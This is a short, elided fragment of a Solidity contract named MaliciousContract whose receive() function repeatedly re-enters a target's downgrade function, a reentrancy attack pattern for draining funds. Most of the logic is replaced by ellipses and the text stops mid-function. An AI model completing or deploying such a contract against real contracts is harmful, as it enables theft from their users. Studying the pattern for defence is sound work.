...
contract MaliciousContract {
    ...
    uint256 private constant MAX_ATTACK_COUNT = 2000000;
    ...
    receive() external payable {
        if (attackCount < MAX_ATTACK_COUNT) {
            ...
            target.downgrade(100000000000 wei);
            attackCount++;
            (bool success,) = address(target).call(abi.encodeWithSignature("downgrade(uint256)", 100000000000 wei));
